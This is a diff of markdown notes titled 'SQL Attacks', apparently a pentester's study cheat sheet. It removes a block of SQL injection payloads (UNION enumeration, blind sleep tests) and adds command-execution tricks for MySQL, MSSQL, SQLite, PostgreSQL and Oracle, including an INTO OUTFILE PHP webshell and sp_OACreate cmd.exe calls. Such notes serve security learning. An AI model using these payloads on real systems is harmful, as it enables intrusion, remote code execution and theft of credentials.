@@ -3,13 +3,7 @@ layout: blank
 pagetitle: SQL Attacks
 ---
 
-https://pentestmonkey.net/category/cheat-sheet/sql-injection
-## Enumeration/Discovery
-- General fuzzing can help, but try to think from the developer's perspective when coming up with the example query
-- Matching on numbers may not use single/double quotes at all
-	- `SELECT * FROM rooms WHERE room_id = 1;` uses no quotes
-
-## MySQL
+**MySQL**
 - MariaDB is an open-source fork
 - `mysql -u {username} -p -h {host IP} -P {port}`
 - Specifying multiple parameters `SELECT user, passhash FROM mysql.user WHERE user = '{username}'`
@@ -17,8 +11,16 @@ https://pentestmonkey.net/category/cheat-sheet/sql-injection
 	- List all databases: `SELECT * FROM information_schema.tables;`
 	- Version: `SELECT @@version;`
 	- Current user: `SELECT system_user();`
+- MySQL RCE via SQLi
+	- Use the `INTO OUTFILE` to create a PHP/JSP/ASPX/etc shell
+		- Example: `' UNION SELECT "<?php system('whoami');?>", null, null INTO OUTFILE "/var/www/html/tmp/shell.php" -- // `
+			- `tmp` is important, because we might not have perms for `/html`
+		- Then, either LFI the new file or straight up access it if possible
+	- Can also extract users/passwords and crack hashes
+	- Could search up phpmyadmin version to get RCE (LFI + session cookie can lead to RCE)
 
-## MSSQL
+
+**MSSQL**
 - Database management built into Windows
 - Command-line tool `SQLCMD` allows SQL queries through cmd
 - Kali has `impacket-mssqlclient` to connect to MSSQL databases
@@ -37,41 +39,23 @@ https://pentestmonkey.net/category/cheat-sheet/sql-injection
 	- Then, `SELECT * FROM {database name from first query}.information_schema.tables;`
 	- This returns the tables within that database, which we can query from with `SELECT * from {database name}.dbo.{table name}`
 		- `dbo` is a table schema
+- Can also use `sp_OACreate` to execute commands
+	`EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT; EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c {command}';`
+- Linked servers can execute remote queries (MSSqlPwner)
 
-## SQLite
+**SQLite**
 - Use `sqlitebrowser` for viewing sqlite databases
+- Can't execute functions, but can load malicious files
+	- `SELECT load_extension('/tmp/malicious.so');`
+- `SQLite CLI` allows command execution with `.shell {command}` or `.system {command}`
+- Outdated versions may have RCE CVEs
 
-## PostgreSQL
+**PostgreSQL**
 - Use `psql` for to connect to PostgreSQL databases
+- Command execution with `COPY mytable TO PROGRAM 'whoami';`
+	- Requires superuser
+- Command execution with `SELECT pg_execute_server_program('id');`
+	- This won't require superuser, but will require `pg_execute_server_program`
 
-## SQL Exploitation
-- Techniques:
-	- Can trail SQL injection queries with `//` to provide visibility on the payload and protect against whitespace truncation
-	- Can use `IN` to inject arbitrary second command:
-		- `' OR 1=1 IN (SELECT version()) -- //`
-		- `' OR 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`
-- Enumerating tables
-	- `' UNION SELECT table_name FROM information_schema.tables -- //`
-	- `' UNION SELECT column_name FROM information_schema.columns WHERE table='{table_name} -- //`
-- UNION-based Payloads
-	- UNION query must include same number of columns as original
-		- To find number of columns, use ORDER BY
-			- `' ORDER BY 1 -- //`
-			- Orders results by a specific column, so it will fail when selected column doesn't exist (iterate through column numbers to find max columns)
-		- Can also do `' UNION SELECT null, null, null, ...` until no error
-		- If we make the original input invalid, then pass a valid union select, we can see where each piece of data ends up
-			- `9999 union select 1,2,3,4,5`
-	- Data types need to be compatible between each column
-	- E.g. `$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["input"]."%'";`
-		- Used `' ORDER BY 5 -- //` and `' ORDER BY 6 -- //` to determine 5 columns
-		- Thus payload becomes `%' UNION SELECT null, null, database(), user(), @@version -- //`, filling unneeded columns (including ID column 1) with null
-- Blind injection
-	- Can use booleans alongside sleep commands to verify existence of data/characters
-		- `' AND IF (1=1, sleep(3), 'false') -- //` 
-- MySQL RCE via SQLi
-	- Use the `INTO OUTFILE` to create a PHP/JSP/ASPX/etc shell
-		- Example: `' UNION SELECT "<?php system('whoami');?>", null, null INTO OUTFILE "/var/www/html/tmp/shell.php" -- // `
-			- `tmp` is important, because we might not have perms for `/html`
-		- Then, either LFI the new file or straight up access it if possible
-	- Can also extract users/passwords and crack hashes
-	- Could search up phpmyadmin version to get RCE (LFI + session cookie can lead to RCE)
+**Oracle**
+- Comand execution with `EXEC dbms_java.runjava('java.lang.Runtime.getRuntime().exec("{command}")');`
